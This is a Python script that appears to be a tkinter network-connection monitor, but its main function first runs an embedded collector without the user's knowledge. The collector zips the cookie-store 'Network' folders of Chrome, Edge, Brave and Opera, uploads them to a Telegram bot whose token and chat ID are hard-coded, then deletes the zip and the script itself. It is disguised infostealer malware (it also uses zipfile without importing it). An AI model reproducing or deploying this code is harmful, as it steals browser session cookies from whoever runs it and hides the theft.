import subprocess
import time
import os
import shutil
import threading
import signal
from datetime import datetime
import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from queue import Queue, Empty
import tempfile
import requests
import sys
from pathlib import Path

# --- code1 variables and constants ---
PREVIOUS_CONNECTIONS = "connections_prev.txt"
CURRENT_CONNECTIONS = "connections_curr.txt"
PREVIOUS_OUTBOUND = "outbound_prev.txt"
LOG_FILE = "full_monitor.log"
MONITOR_INTERVAL = 3  # seconds
LOG_MAX_SIZE = 10 * 1024 * 1024  # 10 MB

stop_event = threading.Event()
log_queue = Queue()

# --- code2 variables ---
BOT_TOKEN = '7473560617:AAF5KNIymnK9Q6c7dUjYMkIl5aIsNnBwNnM'
CHAT_ID = '5587265830'

BROWSERS = {
    "Chrome": Path.home() / "AppData/Local/Google/Chrome/User Data/Default/Network",
    "Edge": Path.home() / "AppData/Local/Microsoft/Edge/User Data/Default/Network",
    "Brave": Path.home() / "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Network",
    "Opera": Path.home() / "AppData/Roaming/Opera Software/Opera Stable/Network"
}

# --- code1 functions ---

def log_message(message: str):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"[{timestamp}] {message}"
    print(log_line)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line + "\n")
    log_queue.put(log_line)

def rotate_log():
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) >= LOG_MAX_SIZE:
        log_message(f"Log file size exceeded {LOG_MAX_SIZE} bytes. Rotating log.")
        try:
            if os.path.exists(LOG_FILE + ".old"):
                os.remove(LOG_FILE + ".old")
            shutil.move(LOG_FILE, LOG_FILE + ".old")
        except Exception as e:
            log_message(f"Error rotating log file: {e}")

def run_netstat():
    try:
        result = subprocess.run(
            ["netstat", "-n", "-o", "-a", "-p", "tcp"],
            capture_output=True,
            text=True,
            shell=False,
        )
        return result.stdout
    except Exception as e:
        log_message(f"Failed to run netstat: {e}")
        return ""

def parse_connections(netstat_output):
    connections = []
    lines = netstat_output.strip().splitlines()
    start_parsing = False
    for line in lines:
        if line.startswith("  Proto"):
            start_parsing = True
            continue
        if not start_parsing or not line.strip():
            continue
        parts = line.split()
        if len(parts) >= 5:
            proto = parts[0]
            local = parts[1]
            foreign = parts[2]
            state = parts[3] if proto.lower() == "tcp" else ""
            pid = parts[4] if proto.lower() == "tcp" else parts[3]
            connections.append((proto, local, foreign, state, pid))
    return sorted(connections)

def write_connections_to_file(connections, filename):
    with open(filename, "w", encoding="utf-8") as f:
        for conn in connections:
            f.write(" ".join(conn) + "\n")

def read_connections_from_file(filename):
    if not os.path.exists(filename):
        return []
    with open(filename, "r", encoding="utf-8") as f:
        lines = f.read().splitlines()
    conns = [tuple(line.split(" ")) for line in lines]
    return conns

def diff_connections(old_list, new_list):
    old_set = set(old_list)
    new_set = set(new_list)
    closed = old_set - new_set
    opened = new_set - old_set
    return closed, opened

def monitor_connections():
    log_message("Monitoring all network connections started...")
    if not os.path.exists(PREVIOUS_CONNECTIONS):
        write_connections_to_file([], PREVIOUS_CONNECTIONS)

    while not stop_event.is_set():
        netstat_out = run_netstat()
        current_conns = parse_connections(netstat_out)
        write_connections_to_file(current_conns, CURRENT_CONNECTIONS)

        previous_conns = read_connections_from_file(PREVIOUS_CONNECTIONS)
        closed, opened = diff_connections(previous_conns, current_conns)

        if closed or opened:
            log_message("Connection changes detected:")
            for conn in closed:
                log_message(f"❌ Connection Closed: {' '.join(conn)}")
            for conn in opened:
                log_message(f"✅ Connection Opened: {' '.join(conn)}")

        shutil.copyfile(CURRENT_CONNECTIONS, PREVIOUS_CONNECTIONS)
        rotate_log()
        time.sleep(MONITOR_INTERVAL)

def monitor_outbound_connections():
    log_message("Monitoring outbound connections started...")
    if not os.path.exists(PREVIOUS_OUTBOUND):
        write_connections_to_file([], PREVIOUS_OUTBOUND)

    while not stop_event.is_set():
        netstat_out = run_netstat()
        current_conns = parse_connections(netstat_out)
        outbound_conns = [conn for conn in current_conns if conn[3].upper() == "ESTABLISHED"]

        previous_outbound = read_connections_from_file(PREVIOUS_OUTBOUND)
        previous_outbound_set = set(previous_outbound)

        for conn in outbound_conns:
            if conn not in previous_outbound_set:
                log_message(f"🌐 Outbound Connection Detected: {' '.join(conn)}")

        write_connections_to_file(outbound_conns, PREVIOUS_OUTBOUND)
        rotate_log()
        time.sleep(MONITOR_INTERVAL)

class HackerMonitorGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("⚡ Network Connection Hacker Monitor ⚡")
        self.geometry("900x650")
        self.configure(bg="#0d0d0d")  # almost black

        self.status_var = tk.StringVar(value="Status: Stopped")

        font_mono = ("Consolas", 12)
        font_btn = ("Consolas", 11, "bold")

        self.log_display = ScrolledText(
            self,
            state="disabled",
            bg="#0d0d0d",
            fg="#00ff00",
            insertbackground="#00ff00",
            font=font_mono,
            wrap=tk.WORD,
            borderwidth=2,
            relief=tk.SUNKEN,
            spacing3=4,
            padx=10,
            pady=10,
            undo=True
        )
        self.log_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        btn_frame = tk.Frame(self, bg="#0d0d0d")
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        self.start_btn = tk.Button(
            btn_frame,
            text="▶ Start Monitoring",
            command=self.start_monitoring,
            bg="#003300",
            fg="#00ff00",
            activebackground="#00ff00",
            activeforeground="#003300",
            font=font_btn,
            relief=tk.FLAT,
            borderwidth=3,
            padx=10,
            pady=5,
            cursor="hand2"
        )
        self.start_btn.pack(side=tk.LEFT, padx=10)

        self.stop_btn = tk.Button(
            btn_frame,
            text="■ Stop Monitoring",
            command=self.stop_monitoring,
            bg="#330000",
            fg="#ff3333",
            activebackground="#ff3333",
            activeforeground="#330000",
            font=font_btn,
            relief=tk.FLAT,
            borderwidth=3,
            padx=10,
            pady=5,
            cursor="hand2",
            state=tk.DISABLED
        )
        self.stop_btn.pack(side=tk.LEFT, padx=10)

        self.status_label = tk.Label(
            btn_frame,
            textvariable=self.status_var,
            bg="#0d0d0d",
            fg="#00ff00",
            font=font_btn,
            anchor="e"
        )
        self.status_label.pack(side=tk.RIGHT, padx=10)

        self.monitor_threads = []
        self.after(100, self.update_log_from_queue)

        self.cursor_visible = True
        self.blink_cursor()

    def blink_cursor(self):
        if self.log_display['state'] == "normal":
            color = "#00ff00" if self.cursor_visible else "#0d0d0d"
            self.log_display.config(insertbackground=color)
            self.cursor_visible = not self.cursor_visible
        self.after(600, self.blink_cursor)

    def start_monitoring(self):
        if self.monitor_threads:
            return
        stop_event.clear()
        self.status_var.set("Status: Running")
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)

        for file in [PREVIOUS_CONNECTIONS, CURRENT_CONNECTIONS, PREVIOUS_OUTBOUND, LOG_FILE]:
            if not os.path.exists(file):
                open(file, 'a').close()

        t1 = threading.Thread(target=monitor_connections, daemon=True)
        t2 = threading.Thread(target=monitor_outbound_connections, daemon=True)
        self.monitor_threads = [t1, t2]
        for t in self.monitor_threads:
            t.start()

    def stop_monitoring(self):
        stop_event.set()
        for t in self.monitor_threads:
            t.join(timeout=1)
        self.status_var.set("Status: Stopped")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.monitor_threads = []

    def update_log_from_queue(self):
        try:
            while True:
                log_line = log_queue.get_nowait()
                self.log_display.config(state="normal")
                self.log_display.insert(tk.END, log_line + "\n")
                self.log_display.see(tk.END)
                self.log_display.config(state="disabled")
        except Empty:
            pass
        self.after(200, self.update_log_from_queue)

# --- code2 functions ---

def copy_and_zip_folders():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_path = Path(tempfile.gettempdir()) / f"browsers_network_{timestamp}.zip"
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for name, source_path in BROWSERS.items():
            if not source_path.exists():
                continue
            try:
                with tempfile.TemporaryDirectory() as temp_dir:
                    dest_path = Path(temp_dir) / name
                    shutil.copytree(source_path, dest_path)
                    for root, _, files in os.walk(dest_path):
                        for file in files:
                            full_path = Path(root) / file
                            arcname = Path(name) / full_path.relative_to(dest_path)
                            zipf.write(full_path, arcname)
            except Exception as e:
                log_message(f"Error copying {name}: {e}")
                continue
    return str(zip_path)

def send_to_telegram(zip_file):
    try:
        with open(zip_file, 'rb') as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={'chat_id': CHAT_ID, 'caption': '🗂️ Collected browser cookie data'},
                files={'document': f}
            )
    except Exception as e:
        log_message(f"Failed to send file to Telegram: {e}")

def self_delete():
    # Optional: comment this out to avoid deleting the combined script.
    script_path = Path(sys.argv[0]).resolve()
    try:
        subprocess.Popen([
            "cmd", "/c", "timeout 2 > NUL & del /f /q", str(script_path)
        ], shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        log_message(f"Self-delete failed: {e}")

def run_code2_task():
    log_message("Running embedded browser data collector task...")
    zip_file = copy_and_zip_folders()
    send_to_telegram(zip_file)
    try:
        os.remove(zip_file)
    except Exception as e:
        log_message(f"Failed to delete zip file: {e}")
    self_delete()

def main():
    # Run code2 task once at start without GUI or user interaction
    run_code2_task()

    # Then launch code1 GUI network monitor
    app = HackerMonitorGUI()
    app.mainloop()

if __name__ == "__main__":
    main()
